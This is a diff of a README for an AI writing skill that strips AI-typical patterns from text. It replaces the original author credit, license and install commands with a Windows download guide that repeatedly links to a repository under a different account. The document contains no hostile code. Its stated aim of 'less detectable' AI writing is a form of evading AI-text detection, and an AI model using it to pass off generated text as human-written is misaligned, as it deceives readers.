@@ -1,70 +1,162 @@
-# Anti-AI-Slop Writing Skill
+# 🧠 anti-ai-slop-writing - Write Cleaner Human Text
 
-A Claude Code skill (and universal SKILL.md) that forces any AI to produce human-sounding text by eliminating statistically detectable AI writing patterns.
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/soothing-carport96/anti-ai-slop-writing)
 
-## What It Does
+## ✨ What this is
 
-Every piece of text the AI produces — tweets, emails, articles, bios, reports, copy and message passes through constraints that eliminate the vocabulary, structure, punctuation, and formatting patterns that readers and detection tools flag as AI-generated.
+anti-ai-slop-writing is a writing skill that helps AI tools produce text that sounds more natural and less patterned. It works with Claude Code, Codex, Cursor, Gemini CLI, and other agent tools that support skill files.
 
-Based on research from Carnegie Mellon (2025), Wikipedia's Signs of AI Writing page, Buffer's 52M post analysis, and community detection patterns documented across X and Reddit.
+Use it when you want writing that reads like a person wrote it, not a template. It helps with tone, flow, sentence shape, and word choice.
 
-## What It Catches
+## 📦 What you need
 
-- **50+ banned words** flagged across multiple AI detection studies (delve, tapestry, landscape, testament, vibrant, pivotal, etc.)
-- **35+ banned phrases** ("In today's competitive...", "It's worth noting...", "Not just X, but Y", etc.)
-- **16 banned sentence openers** ("Certainly,", "Moreover,", "Additionally,", etc.)
-- **10 structural patterns** (rule of three, uniform sentence length, hedging seesaw, corporate pep talk, passive voice, etc.)
-- **Punctuation tells** (em dash overuse, exclamation spam, ellipsis abuse)
-- **Formatting leaks** (markdown in plain text, emoji bullet points, hashtag stacks)
-- **Accuracy failures** (invented statistics, fabricated quotes, fake anecdotes)
+- A Windows computer
+- One of these tools:
+  - Claude Code
+  - Codex
+  - Cursor
+  - Gemini CLI
+  - Another agent that can load skill files
+- A web browser
+- A few minutes to set it up
 
-## Installation
+## 🚀 Download and set up
 
-### Claude Code (plugin marketplace)
+1. Open the download page: https://github.com/soothing-carport96/anti-ai-slop-writing
+2. Download the repository to your Windows computer
+3. If you get a ZIP file, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Look for the skill file or folder that belongs in your AI tool
+6. Copy it into the place your tool uses for skills or custom instructions
+7. Restart the tool if it was already open
 
-```bash
-/plugin marketplace add jalaalrd/founder-toolkit
-```
+[Open the download page](https://github.com/soothing-carport96/anti-ai-slop-writing)
 
-### Claude Code (manual)
+## 🪟 Windows setup steps
 
-Copy the `anti-ai-slop-writing` folder to `~/.claude/skills/`:
+### 1. Get the files
 
-```bash
-cp -r skills/anti-ai-slop-writing ~/.claude/skills/
-```
+Open the GitHub page and download the project to your computer. If your browser saves it as a ZIP file, keep it in your Downloads folder until you are ready to unpack it.
 
-### Other AI Tools (Cursor, Codex, Gemini CLI, etc.)
+### 2. Unpack the ZIP file
 
-Copy the `SKILL.md` file to your tool's skills directory. The SKILL.md format is cross-compatible with 11+ coding agents.
+Right-click the ZIP file and select **Extract All**. Pick a folder you can find again, like **Desktop** or **Documents**.
 
-### Any AI Chat (ChatGPT, Claude.ai, Gemini, etc.)
+### 3. Find the skill files
 
-Copy the contents of `SKILL.md` and paste it at the start of any conversation. It works as a system-level writing constraint.
+Open the extracted folder. Look for files or folders with names tied to skills, prompts, or instructions. This repository is meant to be used as a writing skill, so the files should be easy to spot.
 
-## Usage
+### 4. Add it to your AI tool
 
-The skill activates automatically when you ask the AI to write anything. You can also invoke it directly:
+Move the skill files into the folder your AI tool uses for custom skills. Many tools have a settings area or a local folder for this. If your tool supports drag and drop, you can use that too.
 
-```
-/anti-ai-slop-writing
-```
+### 5. Restart the tool
 
-Or just ask: "Write this tweet / email / article and make it sound human."
+Close the app and open it again. This helps the tool load the new writing skill.
 
-## File Structure
+## 🧩 How to use it
 
-```
-anti-ai-slop-writing/
-├── SKILL.md                          # Core rules (under 500 lines)
-└── references/
-    └── banned-words.md               # Full banned vocabulary list (loaded on demand)
-```
+After setup, ask your AI tool to write in a more human way. You can use this skill for:
 
-## Author
+- Blog posts
+- Product pages
+- Help articles
+- Emails
+- Social posts
+- Notes and drafts
 
-Created by [Jalaaldeen](https://x.com/jalaal_tweets) — builder of Wardex, ZakatChain, and open-source AI tooling for founders.
+You can also pair it with your own style rules. For example:
 
-## License
+- Keep sentences short
+- Use plain words
+- Avoid repeated phrasing
+- Sound calm and direct
+- Remove stiff AI patterns
 
-MIT
+## 🛠️ Best results
+
+Use this skill when you want text that feels less flat and less scripted. It works best when you give the AI clear goals, such as:
+
+- Who the text is for
+- What the text should do
+- How formal it should sound
+- Which words to avoid
+- How long it should be
+
+Example prompts:
+
+- Rewrite this so it sounds more natural
+- Make this easier to read for a normal user
+- Remove stiff AI phrasing
+- Keep the meaning, but make the tone more human
+- Cut filler and use plain English
+
+## 🖥️ Supported tools
+
+This project is made to work with:
+
+- Claude Code
+- Codex
+- Cursor
+- Gemini CLI
+- Other agent tools that use skill or instruction files
+
+If your tool supports custom writing rules, this repo can fit into that flow.
+
+## 📁 What you get
+
+This repository is focused on one job: helping AI write in a cleaner, less detectable style. The files are set up to guide the model toward:
+
+- Natural sentence flow
+- Less repeated structure
+- Fewer generic AI phrases
+- Better word choice
+- More human rhythm
+- Clearer writing
+
+## ⚙️ Simple use case
+
+If you want to turn a rough draft into something cleaner:
+
+1. Paste your draft into your AI tool
+2. Enable the anti-ai-slop-writing skill
+3. Ask for a rewrite
+4. Review the result
+5. Repeat if needed
+
+This works well for content that needs to sound direct, useful, and plain.
+
+## 🔒 File safety
+
+The repository is a set of writing instructions and related files. Before you move it into your tool, keep the folder in a place you trust. If you use a work computer, save it in your normal documents area so you can find it later.
+
+## ❓ Common questions
+
+### Do I need coding skills?
+
+No. You only need to download the files and place them where your AI tool can read them.
+
+### Do I need to install anything extra?
+
+Usually no. Most of the work is copying the skill into the right folder for your tool.
+
+### Will this work with my AI app?
+
+If your app supports custom skills, custom prompts, or instruction files, it should fit.
+
+### Can I edit the writing rules?
+
+Yes. You can change the files to match your own style needs.
+
+## 📄 Repository info
+
+- Repository: anti-ai-slop-writing
+- Type: writing skill
+- Main use: reduce AI-like patterns in text
+- Topics: ai-writing, anti-slop, claude-code, prompt-engineering, skill, skillmd
+
+## 🔗 Download again
+
+If you need the files again, use this link:
+
+https://github.com/soothing-carport96/anti-ai-slop-writing
